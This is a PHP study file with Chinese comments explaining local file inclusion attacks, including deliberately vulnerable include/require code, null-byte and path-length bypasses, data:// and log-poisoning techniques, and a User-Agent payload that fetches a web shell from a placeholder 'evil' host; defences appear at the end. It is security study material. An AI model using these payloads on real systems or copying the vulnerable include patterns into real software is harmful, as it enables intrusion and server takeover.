<?php
//原因:php内核不會在意被包含的文件類型是什麽
//危險函數:include(),require(),include_once(),require_once()
// fopen(),fread()等等


// 常見的技巧,用於LFI后執行PHP代碼:
// 1.包含用戶上傳的文件

//寫法1,添加後綴,限定類型
//繞過:
// 1.\0截斷
// 由於PHP的底層是c實現的,所以對於字符串類型,可以用截斷字符\0來繞過後綴
$file=$_GET['file']; //"../../../etc/passwd\0"
if(file_exists('./'.$file.'.php')){
    echo './'.$file.'.php';
    include './'.$file.'.php';
}

//寫法2,過濾\0截斷字符
function getVar($name)
{
    $value=isset($name)?$name:null;
    if(is_string($value))
    {
        $value=str_replace("\\0",'',$value);
        echo $value;
    }
}
$name=$_GET["name"];
getVar($name);
// 繞過:
// 1.雙寫
// 2.超長度截斷+目錄遍歷(Path Traversal)
// background info:
// os的文件長度有最大限制,windows下是256,linux下是4096
// case1:././././././././$file
// case2:////////$file
// case3:../1/$file/../1/$file


// 2.包含data://或者php://input等僞協議
$file2=$_GET["file2"];
if($file2)
{
    require $_GET["file2"];
}
// payload
/* file2=data:text/plain,<?php phpinfo();?>%00 */
// 需要allow_url_include=No
// 對應的配置文件為 /usr/local/etc/php/conf.d/docker-php-ext-sodium.ini,在後面添加對應的配置即可


// 3.包含session文件
// 條件比較苛刻,默認的session文件為:/tmp/sess_SESSIONID


// 4.包含日志文件,比如webserver的accesslog
// 最通用的技巧
// 原理:
// webserver會講請求記錄寫入access_log和error_log裏面,
// 那麽我們可以將php代碼寫入到日志中,在文件包含時包含日志文件
// NOTE:包含過大的日志文件PHP進程可能會僵死,解決方法:每天凌晨寫入日志,這時候日志恩小
// 攻擊步驟:
// 1.讀取http.conf讀取日志文件所在的目錄
// 一般在如下目錄:
// /etc/httpd/logs/access_log
// /usr/local/apache/logs/access_log
// /var/log/access_log
// /var/log/apache/access_log
// /var/log/httpd/access_log
// /var/www/log/error_log
// /var/www/logs/error_log
// MSF的自動包含日志模塊:
// exploit/unit/webapp/php_lfi


// 5.包含/proc/self/environ文件
// payload=$url=../../../../../../../../proc/self/environ
// 这个文件可以看到web进程运行的环境变量(docker下看不到)
// 可以在User-agent中注入PHP代码
/* payload=<?php system("wget http://evil/phpshell.txt -O shell.php")?>*/
// 防御方法:设置open_basedir


// 6.包含上傳的臨時文件(RFC1867)
// php上传的过程会先将文件放在临时目录下,之后再移到指定的上传目录,通常这个目录是/tmp
// 可以通过修改upload_tmp_dir来查看


// 7.包含其他應用創建的文件,比如數據庫文件,緩存文件,應用日志文件等,需要具體情況具體分析 


//防禦方法:
// 1.設置php的open_basedir
// open_basedir = $path
// 2. 避免包含動態的變量,特別是用戶的輸入變量,一種合理的方案是枚舉


?>